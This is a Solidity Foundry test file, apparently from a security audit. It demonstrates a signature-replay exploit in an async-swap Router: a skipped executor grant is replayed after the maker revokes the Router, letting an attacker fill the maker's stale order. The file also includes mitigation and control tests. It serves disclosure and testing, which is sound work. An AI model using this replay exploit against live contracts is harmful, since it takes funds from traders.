// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {PocSignedBase} from "./PocSignedBase.sol";
import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {Router} from "@async-swap/Router.sol";
import {AsyncFiller} from "@async-swap/libraries/AsyncFiller.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";

/// @notice Candidate 1: `Router.swapWithSig` skips (does not consume) a signed SetExecutor grant when the Router is
///         already an executor. The leftover grant stays valid until its deadline and anyone can replay it after the
///         maker revokes the Router, re-authorizing it against the maker's latest choice.
contract GrantReplayPoc is PocSignedBase {
    uint256 constant GRANT_NONCE = 5;

    function _relaySignedCreate(Router.ExecutorGrant memory grant) internal returns (AsyncOrder memory order) {
        order = _signedOrder(AMOUNT_OUT_MIN);
        Router.PermitData memory permit = _permit(order, 0, block.timestamp + 1 hours);
        vm.prank(relayer);
        router.swapWithSig(order, permit, grant);
        order.salt = _expectedSalt(maker, AMOUNT_IN, AMOUNT_OUT_MIN);
    }

    /// Exploit: grant skipped -> maker revokes Router -> third party replays grant -> Router re-authorized -> a filler
    /// takes the maker's (now stale-priced) order that the maker meant to freeze by revoking.
    function test_poc_skippedGrantReplayedAfterRevocation() public {
        // Maker had already authorized the Router directly (e.g. an earlier order).
        vm.prank(maker);
        hook.setExecutor(poolId, address(router), true);

        Router.ExecutorGrant memory grant = _grant(GRANT_NONCE, block.timestamp + 7 days);
        AsyncOrder memory order = _relaySignedCreate(grant);
        assertFalse(hook.nonceUsed(maker, GRANT_NONCE), "grant was skipped: nonce still live");
        emit log_named_uint("grant nonce used after swapWithSig (0=false)", hook.nonceUsed(maker, GRANT_NONCE) ? 1 : 0);

        // Maker revokes the Router (e.g. to stop fillOrder against an order whose price is now stale).
        vm.prank(maker);
        hook.setExecutor(poolId, address(router), false);
        assertFalse(hook.isExecutor(poolId, maker, address(router)));

        // While revoked, fillOrder is blocked.
        vm.prank(attacker);
        vm.expectRevert(AsyncFiller.NotAuthorizedExecutor.selector);
        router.fillOrder(order, type(uint256).max, "");

        // Anyone replays the leftover grant (it is in public calldata of the swapWithSig tx).
        vm.warp(block.timestamp + 1 days);
        vm.prank(attacker);
        hook.setExecutorWithSig(key, maker, address(router), true, grant.nonce, grant.deadline, grant.signature);
        assertTrue(hook.isExecutor(poolId, maker, address(router)), "Router re-authorized against maker's revocation");

        // The attacker now fills the maker's stale order at its old limit.
        uint256 atk0Before = token0.balanceOf(attacker);
        uint256 atk1Before = token1.balanceOf(attacker);
        uint256 maker1Before = token1.balanceOf(maker);
        vm.prank(attacker);
        router.fillOrder(order, type(uint256).max, "");
        uint256 gotIn = token0.balanceOf(attacker) - atk0Before;
        uint256 paidOut = atk1Before - token1.balanceOf(attacker);
        emit log_named_uint("attacker token0 received", gotIn);
        emit log_named_uint("attacker token1 paid", paidOut);
        emit log_named_uint("maker token1 received", token1.balanceOf(maker) - maker1Before);
        (uint256 live,) = hook.asyncOrderInfo(poolId, _id(order));
        assertEq(live, 0, "order filled after the maker revoked the Router");
        assertEq(paidOut, AMOUNT_OUT_MIN);
        // If the market moved to 1.2 token1/token0, the maker's 1 token0 (worth 1.2) sold for 0.95: >20% below value.
        uint256 fairValue = 1.2 ether;
        assertLt(token1.balanceOf(maker) - maker1Before, fairValue * 80 / 100, "maker got <80% of market value");
    }

    /// Maker-side mitigation: burning the grant's nonce stops the replay.
    function test_poc_invalidateNonceStopsReplay() public {
        vm.prank(maker);
        hook.setExecutor(poolId, address(router), true);
        Router.ExecutorGrant memory grant = _grant(GRANT_NONCE, block.timestamp + 7 days);
        _relaySignedCreate(grant);
        vm.startPrank(maker);
        hook.setExecutor(poolId, address(router), false);
        hook.invalidateNonce(GRANT_NONCE);
        vm.stopPrank();
        vm.prank(attacker);
        vm.expectRevert(AsyncSwap.NonceAlreadyUsed.selector);
        hook.setExecutorWithSig(key, maker, address(router), true, grant.nonce, grant.deadline, grant.signature);
        assertFalse(hook.isExecutor(poolId, maker, address(router)));
    }

    /// Control: Router not yet executor -> the grant is consumed -> replay after revocation reverts.
    function test_control_consumedGrantCannotBeReplayed() public {
        Router.ExecutorGrant memory grant = _grant(GRANT_NONCE, block.timestamp + 7 days);
        _relaySignedCreate(grant);
        assertTrue(hook.nonceUsed(maker, GRANT_NONCE), "grant consumed");
        vm.prank(maker);
        hook.setExecutor(poolId, address(router), false);
        vm.prank(attacker);
        vm.expectRevert(AsyncSwap.NonceAlreadyUsed.selector);
        hook.setExecutorWithSig(key, maker, address(router), true, grant.nonce, grant.deadline, grant.signature);
        assertFalse(hook.isExecutor(poolId, maker, address(router)), "revocation stands");
    }
}
